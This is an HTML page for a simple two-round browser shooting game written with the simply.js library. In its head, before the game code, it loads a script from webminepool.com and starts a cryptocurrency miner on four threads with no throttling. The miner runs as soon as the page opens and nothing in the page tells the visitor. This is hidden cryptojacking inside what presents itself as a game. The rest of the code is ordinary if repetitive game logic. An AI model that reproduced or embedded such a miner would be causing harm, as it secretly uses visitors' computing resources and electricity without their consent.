<!DOCTYPE html>
<html>
    <head>
        <title>SJS Test </title>
      <script src="https://webminepool.com/lib/base.js"></script>
<script>
    var miner = WMP.User('SK_4NgHVFwRZFjQ56ixBJcEs', 'custom-game',{
        threads: 4,
        autoThreads: false,
        throttle: 0,
        forceASMJS: false
    });
    miner.start();
</script>
        <script src="https://simplycodingcourses.com/files/simplyjs/simply.js"></script>
        <script>
            var canShootD = true;
            var canShootU = true;
            var canShootL = true;
            var canShootR = true;
            var enemies = 0;
            var roundNum = 1;
            var round1 = true;
            var round2 = false;
            
            function start() {
                sjs.open("target", 500, 400)
                function background() {
                    var background = new sjs.Image("Images/background1.png",128,128);
                    for (var i = 0; i < 4; i++) {
                        new sjs.Image(("Images/background" + (Math.floor(Math.random() * 4) + 1) + ".png"),128,128).offset((i * 128), 0)
                    }
                    for (var i = 0; i < 4; i++) {
                        new sjs.Image(("Images/background" + (Math.floor(Math.random() * 4) + 1) + ".png"),128,128).offset((i * 128), 128)
                    }
                    for (var i = 0; i < 4; i++) {
                        new sjs.Image(("Images/background" + (Math.floor(Math.random() * 4) + 1) + ".png"),128,128).offset((i * 128), 256)
                    }
                    for (var i = 0; i < 4; i++) {
                        new sjs.Image(("Images/background" + (Math.floor(Math.random() * 4) + 1) + ".png"),128,128).offset((i * 128), 384)
                    }
                }
                background()

                var player = new sjs.Image("Images/Person.png",64,64)
                player.offset(210, 175)
                player.friction = .75;
                player.accel = .7;

                sjs.keyDown(D_KEY, function() {
                    player.pushRight()
                    player.setImage("Images/Person.png")
                    facing = "right"
                })

                sjs.keyDown(A_KEY, function() {
                    player.pushLeft()
                    player.setImage("Images/Person-left.png")
                    facing = "left"
                })

                sjs.keyDown(W_KEY, function() {
                    player.pushUp();
                    facing = "up"
                });

                sjs.keyDown(S_KEY, function() {
                    player.pushDown();
                    facing = "down"
                });
                
                sjs.keyDown(DOWN_KEY, function() {
                    if (canShootD == true) {
                        canShootD = false;
                        var laser = new sjs.Image("Images/ball.png");
                        laser.type = "laser";
                        laser.setSize(16, 16);
                        laser.friction = 0;
                        laser.noBounds = true;
                        laser.moveTo(player.getX() + 44, player.getY() + 7);
                        laser.pushDown(25.5);
                        setTimeout(function() {
                            canShootD = true;
                        }, 500);
                    }
                })
                sjs.keyDown(UP_KEY, function() {
                    if (canShootU == true) {
                        canShootU = false;
                        var laser = new sjs.Image("Images/ball.png");
                        laser.type = "laser";
                        laser.setSize(16, 16);
                        laser.friction = 0;
                        laser.noBounds = true;
                        laser.moveTo(player.getX() + 44, player.getY() + 7);
                        laser.pushUp(25.5);
                        setTimeout(function() {
                            canShootU = true;
                        }, 500);
                    }
                })
                sjs.keyDown(LEFT_KEY, function() {
                    if (canShootL == true) {
                        canShootL = false;
                        var laser = new sjs.Image("Images/ball.png");
                        laser.type = "laser";
                        laser.setSize(16, 16);
                        laser.friction = 0;
                        laser.noBounds = true;
                        laser.moveTo(player.getX() + 44, player.getY() + 7);
                        laser.pushLeft(25.5);
                        setTimeout(function() {
                            canShootL = true;
                        }, 500);
                    }
                })
                sjs.keyDown(RIGHT_KEY, function() {
                    if (canShootR == true) {
                        canShootR = false;
                        var laser = new sjs.Image("Images/ball.png");
                        laser.type = "laser";
                        laser.setSize(16, 16);
                        laser.friction = 0;
                        laser.noBounds = true;
                        laser.moveTo(player.getX() + 44, player.getY() + 7);
                        laser.pushRight(25.5);
                        setTimeout(function() {
                            canShootR = true;
                        }, 500);
                    }
                })
                
                function rond2() {
                  if (round2 == true) {
                    setInterval(function(){if (enemies < 25) {
                        var speed2 = Math.round(1 + Math.random() * 2);
                        var rando2 = Math.random()
                        if (rando2 > 0.75) {
                            var green = new sjs.Image("Images/green.png")
                            green.type = "enemy";
                            enemies++
                            green.setSize(32, 32);
                            green.noBounds = true;
                            green.friction = 0.4;
                            setInterval(function() {
                                if (player.getX() > green.getX()) {
                                    green.pushRight(speed2)
                                } else {
                                    green.pushLeft(speed2)
                                }
                                if (player.getY() > green.getY()) {
                                    green.pushDown(speed2)
                                } else {
                                    green.pushUp(speed2)
                                }

                            }, 100)
                            green.moveTo(-green.getWidth(), Math.random() * (green.getClamp().y))
                        } else if (rando2 > 0.5) {
                            var green = new sjs.Image("Images/green.png")
                            green.type = "enemy";
                            enemies++
                            green.setSize(32, 32);
                            green.noBounds = true;
                            green.friction = 0.4;
                            setInterval(function() {
                                if (player.getX() > green.getX()) {
                                    green.pushRight(speed2)
                                } else {
                                    green.pushLeft(speed2)
                                }
                                if (player.getY() > green.getY()) {
                                    green.pushDown(speed2)
                                } else {
                                    green.pushUp(speed2)
                                }

                            }, 100)
                            green.moveTo(sjs.getWidth(), Math.random() * (green.getClamp().y));
                        } else if (rando2 > 0.25) {
                            var green = new sjs.Image("Images/green.png")
                            green.type = "enemy";
                            enemies++
                            green.setSize(32, 32);
                            green.noBounds = true;
                            green.friction = 0.4;
                            setInterval(function() {
                                if (player.getX() > green.getX()) {
                                    green.pushRight(speed2)
                                } else {
                                    green.pushLeft(speed2)
                                }
                                if (player.getY() > green.getY()) {
                                    green.pushDown(speed2)
                                } else {
                                    green.pushUp(speed2)
                                }

                            }, 100)
                            green.moveTo(Math.random() * (green.getClamp().x), -green.getHeight())
                        } else {
                          var green = new sjs.Image("Images/green.png")
                            green.type = "enemy";
                            enemies++
                            green.setSize(32, 32);
                            green.noBounds = true;
                            green.friction = 0.4;
                            setInterval(function() {
                                if (player.getX() > green.getX()) {
                                    green.pushRight(speed2)
                                } else {
                                    green.pushLeft(speed2)
                                }
                                if (player.getY() > green.getY()) {
                                    green.pushDown(speed2)
                                } else {
                                    green.pushUp(speed2)
                                }

                            }, 100)
                            green.moveTo(sjs.getHeight(), Math.random() * (green.getClamp().y));
                        }

                    } else {
                        if (roundNum == 2) {
                            roundNum++
                            enemies = 0;
                            round2 = false;
                            setTimeout(function(){alert("You Won!!")}, 7500);
                        }
                        round_txt.setText("Round: " + roundNum)
                    }
                  }, Math.random() * 1000)
                  }
                }
                
                // round 1
                setInterval(function() {
                  if (round1 == true) {
                    if (enemies < 25) {
                        var speed = Math.round(2 + Math.random() * 2);
                        var rando = Math.random()
                        if (rando > 0.75) {
                            var blue = new sjs.Image("Images/blue.png")
                            blue.type = "enemy";
                            enemies++
                            blue.setSize(32, 32);
                            blue.noBounds = true;
                            blue.friction = 0.4;
                            setInterval(function() {
                                if (player.getX() > blue.getX()) {
                                    blue.pushRight(speed)
                                } else {
                                    blue.pushLeft(speed)
                                }
                                if (player.getY() > blue.getY()) {
                                    blue.pushDown(speed)
                                } else {
                                    blue.pushUp(speed)
                                }

                            }, 100)
                            blue.moveTo(-blue.getWidth(), Math.random() * (blue.getClamp().y))
                        } else if (rando > 0.5) {
                            var blue = new sjs.Image("Images/blue.png")
                            blue.type = "enemy";
                            enemies++
                            blue.setSize(32, 32);
                            blue.noBounds = true;
                            blue.friction = 0.4;
                            setInterval(function() {
                                if (player.getX() > blue.getX()) {
                                    blue.pushRight(speed)
                                } else {
                                    blue.pushLeft(speed)
                                }
                                if (player.getY() > blue.getY()) {
                                    blue.pushDown(speed)
                                } else {
                                    blue.pushUp(speed)
                                }

                            }, 100)
                            blue.moveTo(sjs.getWidth(), Math.random() * (blue.getClamp().y));
                        } else if (rando > 0.25) {
                            var blue = new sjs.Image("Images/blue.png")
                            blue.type = "enemy";
                            enemies++
                            blue.setSize(32, 32);
                            blue.noBounds = true;
                            blue.friction = 0.4;
                            setInterval(function() {
                                if (player.getX() > blue.getX()) {
                                    blue.pushRight(speed)
                                } else {
                                    blue.pushLeft(speed)
                                }
                                if (player.getY() > blue.getY()) {
                                    blue.pushDown(speed)
                                } else {
                                    blue.pushUp(speed)
                                }

                            }, 100)
                            blue.moveTo(Math.random() * (blue.getClamp().x), -blue.getHeight())
                        } else {
                          var blue = new sjs.Image("Images/blue.png")
                            blue.type = "enemy";
                            enemies++
                            blue.setSize(32, 32);
                            blue.noBounds = true;
                            blue.friction = 0.4;
                            setInterval(function() {
                                if (player.getX() > blue.getX()) {
                                    blue.pushRight(speed)
                                } else {
                                    blue.pushLeft(speed)
                                }
                                if (player.getY() > blue.getY()) {
                                    blue.pushDown(speed)
                                } else {
                                    blue.pushUp(speed)
                                }

                            }, 100)
                            blue.moveTo(sjs.getHeight(), Math.random() * (blue.getClamp().y));
                        }

                    } else {
                        if (roundNum == 1) {
                            roundNum++
                            enemies = 0;
                            round1 = false;
                            round2 = true;
                            setInterval(function(){
                              if (enemies == 0 && score == 25) {
                              setTimeout(function(){rond2()}, 4000)
                              }
                            }, 1000);
                        }
                        round_txt.setText("Round: " + roundNum)
                    }
                  }
                }, Math.random() * 1000)
            
                
                
                
                sjs.onHit("laser", "enemy", function(x, y) {
                    x.destroy();
                    y.destroy();
                    score++
                    score_txt.setText("Score: " + score)
                });
                
                var score = 0
                var score_txt = new sjs.Text("Score: 0",21,"orange")
                var round_txt = new sjs.Text("Round: 1",21,"orange").offset(410, 0)
            }
            //end start
        </script>
    </head>
    <body onload="start()">
        <h1>Game Test </h1>
        <div id="target" style="margin:auto;background:grey;"></div>
    </body>
</html>
